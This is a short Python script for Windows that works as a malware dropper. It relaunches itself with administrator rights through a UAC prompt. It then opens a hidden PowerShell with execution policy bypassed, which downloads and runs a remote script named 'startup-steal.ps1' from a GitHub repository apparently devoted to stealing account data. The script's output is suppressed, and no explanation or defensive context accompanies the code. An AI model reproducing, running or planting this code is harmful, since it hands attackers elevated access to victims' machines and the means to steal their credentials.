import sys
import ctypes
if not ctypes.windll.shell32.IsUserAnAdmin() == 1:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        exit()

__import__('subprocess').Popen('powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/startup-steal.ps1 | iex"', shell=True, stdout=-3, stderr=-3)
